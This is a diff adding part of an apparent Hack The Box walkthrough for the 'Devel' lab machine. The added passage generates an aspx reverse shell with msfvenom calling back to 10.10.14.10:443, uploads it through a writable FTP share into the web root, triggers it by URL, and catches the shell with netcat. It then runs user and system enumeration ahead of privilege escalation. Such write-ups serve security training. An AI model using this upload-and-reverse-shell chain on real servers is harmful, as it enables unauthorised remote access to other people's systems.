@@ -156,3 +156,150 @@ Now we can check if there is in the website too, adding "testing.txt" to the bas
 
 This confirms that the FTP server has `write` permissions to the web `root` directory, opening the door for uploading `malicious` payloads such as web shells.
 
+Windows servers typically execute two types of script `extensions`, asp and aspx, to test this one, we are going to use an `aspx` reverse shell created with `Msfvenom`:
+
+<br />
+
+```bash
+❯ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f aspx -o reverse.aspx
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of aspx file: 2725 bytes
+Saved as: reverse.aspx
+```
+
+<br />
+
+Upload to the `FTP` server:
+
+<br />
+
+```bash
+ftp> put reverse.aspx
+local: reverse.aspx remote: reverse.aspx
+229 Entering Extended Passive Mode (|||49163|)
+125 Data connection already open; Transfer starting.
+100% |******************************************************************************************************************************************|  2763       29.27 MiB/s    --:-- ETA
+226 Transfer complete.
+2763 bytes sent in 00:00 (64.56 KiB/s)
+```
+
+<br />
+
+And execute it listing on the website with the following URL:
+
+<br />
+
+``` 
+http://10.10.10.5/reverse.aspx
+```
+
+<br />
+
+Check the listener:
+
+<br />
+
+```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.5] 49164
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+c:\windows\system32\inetsrv>whoami
+
+iis apppool\web
+```
+
+<br />
+
+Perfect! We have access to the `IIS` virtual account associated with the `system`.
+
+<br />
+
+```bash
+c:\Users>dir
+
+ Volume in drive C has no label.
+ Volume Serial Number is 137F-3971
+
+ Directory of c:\Users
+
+18/03/2017  02:16 ��    <DIR>          .
+18/03/2017  02:16 ��    <DIR>          ..
+18/03/2017  02:16 ��    <DIR>          Administrator
+17/03/2017  05:17 ��    <DIR>          babis
+18/03/2017  02:06 ��    <DIR>          Classic .NET AppPool
+14/07/2009  10:20 ��    <DIR>          Public
+               0 File(s)              0 bytes
+               6 Dir(s)   4.692.590.592 bytes free
+
+c:\Users>cd babis
+
+Access is denied.
+```
+
+<br />
+
+But we don't have privileges to access `babis` home directory and list the user.txt, so we need to escalate privileges.
+
+<br />
+
+# Privilege Escalation: IIS virtual account -> NT AUTHORITY\SYSTEM 
+
+<br />
+
+One of the first things we should do after gaining access to a `Windows` system is to enumerate the system `information`:
+
+<br />
+
+```bash
+c:\Users>systeminfo
+
+Host Name:                 DEVEL
+OS Name:                   Microsoft Windows 7 Enterprise 
+OS Version:                6.1.7600 N/A Build 7600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          babis
+Registered Organization:   
+Product ID:                55041-051-0948536-86302
+Original Install Date:     17/3/2017, 4:17:31 ��
+System Boot Time:          7/4/2025, 1:48:42 ��
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               X86-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: x64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             el;Greek
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+Total Physical Memory:     3.071 MB
+Available Physical Memory: 2.484 MB
+Virtual Memory: Max Size:  6.141 MB
+Virtual Memory: Available: 5.559 MB
+Virtual Memory: In Use:    582 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                                 Connection Name: Local Area Connection 4
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.5
+                                 [02]: fe80::f439:aafb:3036:7c2c
+                                 [03]: dead:beef::d157:4032:3684:659c
+                                 [04]: dead:beef::f439:aafb:3036:7c2c
+```
+
+<br />
